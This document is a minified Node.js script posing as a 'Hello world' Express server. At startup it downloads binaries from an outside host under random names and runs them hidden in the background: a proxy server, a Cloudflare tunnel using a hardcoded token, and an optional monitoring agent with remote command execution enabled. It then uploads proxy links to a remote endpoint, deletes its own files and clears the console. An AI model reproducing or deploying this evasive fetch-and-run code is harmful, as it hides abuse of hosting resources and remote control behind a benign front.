const express=require("express"),app=express(),axios=require("axios"),os=require("os"),fs=require("fs"),path=require("path"),{promisify:promisify}=require("util"),exec=promisify(require("child_process").exec),{execSync:execSync}=require("child_process"),UPLOAD_URL=process.env.UPLOAD_URL||"",PROJECT_URL=process.env.PROJECT_URL||"",AUTO_ACCESS=process.env.AUTO_ACCESS||!1,FILE_PATH=process.env.FILE_PATH||"./tmp",SUB_PATH=process.env.SUB_PATH||"8080",PORT=process.env.SERVER_PORT||process.env.PORT||3e3,UUID=process.env.UUID||"e0be083c-45cb-4f64-b779-6e93656d85fb",NEZHA_SERVER=process.env.NEZHA_SERVER||"",NEZHA_PORT=process.env.NEZHA_PORT||"",NEZHA_KEY=process.env.NEZHA_KEY||"",ARGO_DOMAIN=process.env.ARGO_DOMAIN||"dddcj.xtm.de5.net",ARGO_AUTH=process.env.ARGO_AUTH||"eyJhIjoiMzU2MWY3ZTg1MDg4OTBhYTczMWU3ZGZmZWM3NjgyZDAiLCJ0IjoiMTIxZjEyN2MtY2ExZS00YWIyLTk0MjUtZTMyZWY4ZTQwZmRjIiwicyI6IlpXRm1OMk0yT1RBdFpqY3laQzAwTjJaakxUZ3pNR1V0WTJReVlqTTBaVGxrTXpkaSJ9",ARGO_PORT=process.env.ARGO_PORT||8001,CFIP=process.env.CFIP||"cdns.doon.eu.org",CFPORT=process.env.CFPORT||443,NAME=process.env.NAME||"dddcj";function generateRandomName(){const e="abcdefghijklmnopqrstuvwxyz";let t="";for(let n=0;n<6;n++)t+=e.charAt(Math.floor(26*Math.random()));return t}fs.existsSync(FILE_PATH)?console.log(`${FILE_PATH} already exists`):(fs.mkdirSync(FILE_PATH),console.log(`${FILE_PATH} is created`));const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path.join(FILE_PATH,npmName),phpPath=path.join(FILE_PATH,phpName),webPath=path.join(FILE_PATH,webName),botPath=path.join(FILE_PATH,botName),subPath=path.join(FILE_PATH,"sub.txt"),listPath=path.join(FILE_PATH,"list.txt"),bootLogPath=path.join(FILE_PATH,"boot.log"),configPath=path.join(FILE_PATH,"config.json");function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs.existsSync(subPath))return;let e;try{e=fs.readFileSync(subPath,"utf-8")}catch{return null}const t=Buffer.from(e,"base64").toString("utf-8").split("\n").filter(e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//.test(e));if(0===t.length)return;return axios.post(`${UPLOAD_URL}/api/delete-nodes`,JSON.stringify({nodes:t}),{headers:{"Content-Type":"application/json"}}).catch(e=>null),null}catch(e){return null}}function cleanupOldFiles(){try{fs.readdirSync(FILE_PATH).forEach(e=>{const t=path.join(FILE_PATH,e);try{fs.statSync(t).isFile()&&fs.unlinkSync(t)}catch(e){}})}catch(e){}}async function generateConfig(){const e={log:{access:"/dev/null",error:"/dev/null",loglevel:"none"},inbounds:[{port:ARGO_PORT,protocol:"vless",settings:{clients:[{id:UUID,flow:"xtls-rprx-vision"}],decryption:"none",fallbacks:[{dest:3001},{path:"/vless-argo",dest:3002},{path:"/vmess-argo",dest:3003},{path:"/trojan-argo",dest:3004}]},streamSettings:{network:"tcp"}},{port:3001,listen:"127.0.0.1",protocol:"vless",settings:{clients:[{id:UUID}],decryption:"none"},streamSettings:{network:"tcp",security:"none"}},{port:3002,listen:"127.0.0.1",protocol:"vless",settings:{clients:[{id:UUID,level:0}],decryption:"none"},streamSettings:{network:"ws",security:"none",wsSettings:{path:"/vless-argo"}},sniffing:{enabled:!0,destOverride:["http","tls","quic"],metadataOnly:!1}},{port:3003,listen:"127.0.0.1",protocol:"vmess",settings:{clients:[{id:UUID,alterId:0}]},streamSettings:{network:"ws",wsSettings:{path:"/vmess-argo"}},sniffing:{enabled:!0,destOverride:["http","tls","quic"],metadataOnly:!1}},{port:3004,listen:"127.0.0.1",protocol:"trojan",settings:{clients:[{password:UUID}]},streamSettings:{network:"ws",security:"none",wsSettings:{path:"/trojan-argo"}},sniffing:{enabled:!0,destOverride:["http","tls","quic"],metadataOnly:!1}}],dns:{servers:["https+local://8.8.8.8/dns-query"]},outbounds:[{protocol:"freedom",tag:"direct"},{protocol:"blackhole",tag:"block"}]};fs.writeFileSync(path.join(FILE_PATH,"config.json"),JSON.stringify(e,null,2))}function getSystemArchitecture(){const e=os.arch();return"arm"===e||"arm64"===e||"aarch64"===e?"arm":"amd"}function downloadFile(e,t,n){const o=e;fs.existsSync(FILE_PATH)||fs.mkdirSync(FILE_PATH,{recursive:!0});const s=fs.createWriteStream(o);axios({method:"get",url:t,responseType:"stream"}).then(e=>{e.data.pipe(s),s.on("finish",()=>{s.close(),console.log(`Download ${path.basename(o)} successfully`),n(null,o)}),s.on("error",e=>{fs.unlink(o,()=>{});const t=`Download ${path.basename(o)} failed: ${e.message}`;console.error(t),n(t)})}).catch(e=>{const t=`Download ${path.basename(o)} failed: ${e.message}`;console.error(t),n(t)})}async function downloadFilesAndRun(){const e=getFilesForArchitecture(getSystemArchitecture());if(0===e.length)return void console.log("Can't find a file for the current architecture");const t=e.map(e=>new Promise((t,n)=>{downloadFile(e.fileName,e.fileUrl,(e,o)=>{e?n(e):t(o)})}));try{await Promise.all(t)}catch(e){return void console.error("Error downloading files:",e)}if((NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath]).forEach(e=>{fs.existsSync(e)&&fs.chmod(e,509,t=>{t?console.error(`Empowerment failed for ${e}: ${t}`):console.log(`Empowerment success for ${e}: ${509..toString(8)}`)})}),NEZHA_SERVER&&NEZHA_KEY)if(NEZHA_PORT){let e="";["443","8443","2096","2087","2083","2053"].includes(NEZHA_PORT)&&(e="--tls");const t=`nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${e} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;try{await exec(t),console.log(`${npmName} is running`),await new Promise(e=>setTimeout(e,1e3))}catch(e){console.error(`npm running error: ${e}`)}}else{const e=NEZHA_SERVER.includes(":")?NEZHA_SERVER.split(":").pop():"",t=new Set(["443","8443","2096","2087","2083","2053"]).has(e)?"true":"false",n=`\nclient_secret: ${NEZHA_KEY}\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: ${NEZHA_SERVER}\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: ${t}\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: ${UUID}`;fs.writeFileSync(path.join(FILE_PATH,"config.yaml"),n);const o=`nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;try{await exec(o),console.log(`${phpName} is running`),await new Promise(e=>setTimeout(e,1e3))}catch(e){console.error(`php running error: ${e}`)}}else console.log("NEZHA variable is empty,skip running");const n=`nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;try{await exec(n),console.log(`${webName} is running`),await new Promise(e=>setTimeout(e,1e3))}catch(e){console.error(`web running error: ${e}`)}if(fs.existsSync(botPath)){let e;e=ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)?`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`:ARGO_AUTH.match(/TunnelSecret/)?`tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`:`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;try{await exec(`nohup ${botPath} ${e} >/dev/null 2>&1 &`),console.log(`${botName} is running`),await new Promise(e=>setTimeout(e,2e3))}catch(e){console.error(`Error executing command: ${e}`)}}await new Promise(e=>setTimeout(e,5e3))}function getFilesForArchitecture(e){let t;if(t="arm"===e?[{fileName:webPath,fileUrl:"https://arm64.ssss.nyc.mn/web"},{fileName:botPath,fileUrl:"https://arm64.ssss.nyc.mn/bot"}]:[{fileName:webPath,fileUrl:"https://amd64.ssss.nyc.mn/web"},{fileName:botPath,fileUrl:"https://amd64.ssss.nyc.mn/bot"}],NEZHA_SERVER&&NEZHA_KEY)if(NEZHA_PORT){const n="arm"===e?"https://arm64.ssss.nyc.mn/agent":"https://amd64.ssss.nyc.mn/agent";t.unshift({fileName:npmPath,fileUrl:n})}else{const n="arm"===e?"https://arm64.ssss.nyc.mn/v1":"https://amd64.ssss.nyc.mn/v1";t.unshift({fileName:phpPath,fileUrl:n})}return t}function argoType(){if(ARGO_AUTH&&ARGO_DOMAIN)if(ARGO_AUTH.includes("TunnelSecret")){fs.writeFileSync(path.join(FILE_PATH,"tunnel.json"),ARGO_AUTH);const e=`\n  tunnel: ${ARGO_AUTH.split('"')[11]}\n  credentials-file: ${path.join(FILE_PATH,"tunnel.json")}\n  protocol: http2\n  \n  ingress:\n    - hostname: ${ARGO_DOMAIN}\n      service: http://localhost:${ARGO_PORT}\n      originRequest:\n        noTLSVerify: true\n    - service: http_status:404\n  `;fs.writeFileSync(path.join(FILE_PATH,"tunnel.yml"),e)}else console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");else console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")}async function extractDomains(){let e;if(ARGO_AUTH&&ARGO_DOMAIN)e=ARGO_DOMAIN,console.log("ARGO_DOMAIN:",e),await generateLinks(e);else try{const t=fs.readFileSync(path.join(FILE_PATH,"boot.log"),"utf-8").split("\n"),n=[];if(t.forEach(e=>{const t=e.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(t){const e=t[1];n.push(e)}}),n.length>0)e=n[0],console.log("ArgoDomain:",e),await generateLinks(e);else{console.log("ArgoDomain not found, re-running bot to obtain ArgoDomain"),fs.unlinkSync(path.join(FILE_PATH,"boot.log")),async function(){try{"win32"===process.platform?await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`):await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`)}catch(e){}}(),await new Promise(e=>setTimeout(e,3e3));const e=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;try{await exec(`nohup ${botPath} ${e} >/dev/null 2>&1 &`),console.log(`${botName} is running`),await new Promise(e=>setTimeout(e,3e3)),await extractDomains()}catch(e){console.error(`Error executing command: ${e}`)}}}catch(e){console.error("Error reading boot.log:",e)}async function generateLinks(e){const t=await async function(){try{const e=await axios.get("https://ipapi.co/json/",{timeout:3e3});if(e.data&&e.data.country_code&&e.data.org)return`${e.data.country_code}_${e.data.org}`}catch(e){try{const e=await axios.get("http://ip-api.com/json/",{timeout:3e3});if(e.data&&"success"===e.data.status&&e.data.countryCode&&e.data.org)return`${e.data.countryCode}_${e.data.org}`}catch(e){}}return"Unknown"}(),n=NAME?`${NAME}-${t}`:t;return new Promise(t=>{setTimeout(()=>{const o={v:"2",ps:`${n}`,add:CFIP,port:CFPORT,id:UUID,aid:"0",scy:"none",net:"ws",type:"none",host:e,path:"/vmess-argo?ed=2560",tls:"tls",sni:e,alpn:"",fp:"firefox"},s=`\nvless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${e}&fp=firefox&type=ws&host=${e}&path=%2Fvless-argo%3Fed%3D2560#${n}\n\nvmess://${Buffer.from(JSON.stringify(o)).toString("base64")}\n\ntrojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${e}&fp=firefox&type=ws&host=${e}&path=%2Ftrojan-argo%3Fed%3D2560#${n}\n    `;console.log(Buffer.from(s).toString("base64")),fs.writeFileSync(subPath,Buffer.from(s).toString("base64")),console.log(`${FILE_PATH}/sub.txt saved successfully`),uploadNodes(),app.get(`/${SUB_PATH}`,(e,t)=>{const n=Buffer.from(s).toString("base64");t.set("Content-Type","text/plain; charset=utf-8"),t.send(n)}),t(s)},2e3)})}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const e={subscription:[`${PROJECT_URL}/${SUB_PATH}`]};try{const t=await axios.post(`${UPLOAD_URL}/api/add-subscriptions`,e,{headers:{"Content-Type":"application/json"}});return t&&200===t.status?(console.log("Subscription uploaded successfully"),t):null}catch(e){e.response&&e.response.status}}else{if(!UPLOAD_URL)return;{if(!fs.existsSync(listPath))return;const e=fs.readFileSync(listPath,"utf-8").split("\n").filter(e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//.test(e));if(0===e.length)return;const t=JSON.stringify({nodes:e});try{const e=await axios.post(`${UPLOAD_URL}/api/add-nodes`,t,{headers:{"Content-Type":"application/json"}});return e&&200===e.status?(console.log("Nodes uploaded successfully"),e):null}catch(e){return null}}}}function cleanFiles(){setTimeout(()=>{const e=[bootLogPath,configPath,webPath,botPath];NEZHA_PORT?e.push(npmPath):NEZHA_SERVER&&NEZHA_KEY&&e.push(phpPath),"win32"===process.platform?exec(`del /f /q ${e.join(" ")} > nul 2>&1`,e=>{console.clear(),console.log("App is running"),console.log("Thank you for using this script, enjoy!")}):exec(`rm -rf ${e.join(" ")} >/dev/null 2>&1`,e=>{console.clear(),console.log("App is running"),console.log("Thank you for using this script, enjoy!")})},9e4)}async function AddVisitTask(){if(AUTO_ACCESS&&PROJECT_URL)try{const e=await axios.post("https://oooo.serv00.net/add-url",{url:PROJECT_URL},{headers:{"Content-Type":"application/json"}});return console.log("automatic access task added successfully"),e}catch(e){return console.error(`Add automatic access task faild: ${e.message}`),null}else console.log("Skipping adding automatic access task")}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask()}catch(e){console.error("Error in startserver:",e)}}app.get("/",function(e,t){t.send("Hello world!")}),cleanFiles(),startserver().catch(e=>{console.error("Unhandled error in startserver:",e)}),app.listen(PORT,()=>console.log(`http server is running on port:${PORT}!`));
